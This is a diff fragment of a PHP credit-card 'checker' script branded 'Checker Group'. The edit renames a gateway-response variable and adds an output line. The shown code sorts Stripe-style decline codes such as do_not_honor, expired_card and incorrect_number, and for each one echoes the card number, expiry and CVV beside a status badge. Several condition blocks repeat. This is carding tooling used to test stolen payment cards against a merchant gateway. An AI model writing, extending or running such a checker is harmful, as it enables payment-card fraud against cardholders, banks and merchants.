   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "lock_timeout")) {
+(strpos($result4,  "lock_timeout")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "transaction_not_allowed")) {
+(strpos($result4,  "transaction_not_allowed")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3, "three_d_secure_redirect")) {
+(strpos($result4, "three_d_secure_redirect")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'Card is declined by your bank, please contact them for additional information.')) {
+(strpos($result4,  'Card is declined by your bank, please contact them for additional information.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3, "missing_payment_information")) {
+(strpos($result4, "missing_payment_information")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3, "Payment cannot be processed, missing credit card number")) {
+(strpos($result4, "Payment cannot be processed, missing credit card number")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'Your card has expired.')) {
+(strpos($result4,  'Your card has expired.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'card number is incorrect.')) {
+(strpos($result4,  'card number is incorrect.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "incorrect_number")) {
+(strpos($result4,  "incorrect_number")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 
 elseif
-(strpos($result3,  'card was declined.')) {
+(strpos($result4,  'card was declined.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "generic_decline")) {
+(strpos($result4,  "generic_decline")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "do_not_honor")) {
+(strpos($result4,  "do_not_honor")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 
 elseif
-(strpos($result3,  "expired_card")) {
+(strpos($result4,  "expired_card")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  'Your card does not support this type of purchase.')) {
+(strpos($result4,  'Your card does not support this type of purchase.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "processing_error")) {
+(strpos($result4,  "processing_error")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3, "service_not_allowed")) {
+(strpos($result4, "service_not_allowed")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 
 elseif
-(strpos($result3,  "parameter_invalid_empty")) {
+(strpos($result4,  "parameter_invalid_empty")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "lock_timeout")) {
+(strpos($result4,  "lock_timeout")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3,  "transaction_not_allowed")) {
+(strpos($result4,  "transaction_not_allowed")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 
 elseif
-(strpos($result3,  'Card is declined by your bank, please contact them for additional information.')) {
+(strpos($result4,  'Card is declined by your bank, please contact them for additional information.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3, "missing_payment_information")) {
+(strpos($result4, "missing_payment_information")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif
-(strpos($result3, "Payment cannot be processed, missing credit card number")) {
+(strpos($result4, "Payment cannot be processed, missing credit card number")) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
 elseif 
-(strpos($result3,  '-1')) {
+(strpos($result4,  '-1')) {
   echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='white'><font class='badge badge-light'> Update Nonce [ Checker Group (𝖜𝖈𝖌) ] </i></font> <br> <font class='badge badge-primary'>$bank [$country] - $type</i></font> <br>";
 }
 
@@ -635,5 +695,6 @@ ob_flush();
 echo $result1;
 echo $result2;
 echo $result3;
+echo $result4;
 
 ?>
